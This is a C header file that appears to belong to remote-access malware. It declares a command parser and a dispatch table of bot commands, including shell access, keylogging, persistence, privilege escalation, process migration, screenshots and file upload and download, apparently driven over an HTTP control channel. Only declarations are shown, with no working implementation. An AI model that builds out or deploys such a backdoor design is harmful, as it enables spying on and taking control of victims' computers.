#ifndef __COMMAND_H_FILE
#define __COMMAND_H_FILE


#define COMMAND_PREFIX '^' // if you use : you\'re sexy
#define COMMAND_DELIMITER ";"
#define SUBCOMMAND_DELIMITER "#"
#define SUBCOMMAND_DELIMITER_C '#'
#define MAX_COMMAND_LEN 128
#define MAX_ARGUMENT_LEN 1024
#define MAX_REPLY_LEN 2048
#define MAX_DECODED_REPLY_LEN MAX_REPLY_LEN*2 //bug __monitor_http use this value but the real name is ENCODED (change)
#define MAX_ENCODED_REPLY_LEN MAX_REPLY_LEN*2
#define MAX_TOKEN_LEN 33


#define OK_REPLY "OK"
#define ERROR_REPLY "ERROR"

struct cmd_struct {
	char *cmd;
	char *arg;
	char *token;
	//char *reply;
};

typedef struct cmd_struct cmd_data;

int __command_parser(char *raw_command,cmd_data *data);
int __command_control(cmd_data *data);
int __command_initialize(cmd_data *data);




/****** COMMANDS MODS *****/
#define MAX_COMMANDS 15

int cc_owned(cmd_data *data);
int cc_download(cmd_data *data);
int cc_exit(cmd_data *data);
int cc_shell(cmd_data *data);
int cc_execute(cmd_data *data);
int cc_register(cmd_data *data);
int cc_process(cmd_data *data);
int cc_migration(cmd_data *data);
int cc_keylogger(cmd_data *data);
int cc_persistence(cmd_data *data);
int cc_upload(cmd_data *data);
int cc_escalate(cmd_data *data);
int cc_screenshot(cmd_data *data);

struct command {
        char *cmd;
        int (* func)(cmd_data *data);
};



#endif /* __COMMAND_H_FILE  */
